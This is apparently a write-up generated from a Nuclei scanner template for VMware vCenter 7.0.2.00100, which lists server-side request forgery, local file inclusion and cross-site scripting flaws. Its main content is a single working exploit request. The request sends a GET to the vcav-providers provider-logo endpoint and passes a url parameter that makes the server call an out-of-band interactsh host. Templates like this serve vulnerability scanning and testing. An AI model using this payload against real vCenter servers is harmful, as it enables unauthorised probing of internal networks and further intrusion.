# Nuclei Template: VMware vCenter - Server-Side Request Forgery/Local File Inclusion/Cross-Site Scripting
**Template ID:** vmware-vcenter-ssrf
**Vulnerability Class:** Server-Side Request Forgery (SSRF)
**Severity:** Critical
**CWE:** CWE-918
**Source:** Nuclei Template (`vmware-vcenter-ssrf.yaml`)

## Vulnerability Information & PoC

## Description
VMware vCenter 7.0.2.00100 is susceptible to multiple vulnerabilities including server-side request forgery, local file inclusion, and cross-site scripting.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=https://{{interactsh-url}}
```

## References
- https://github.com/l0ggg/VMware_vCenter
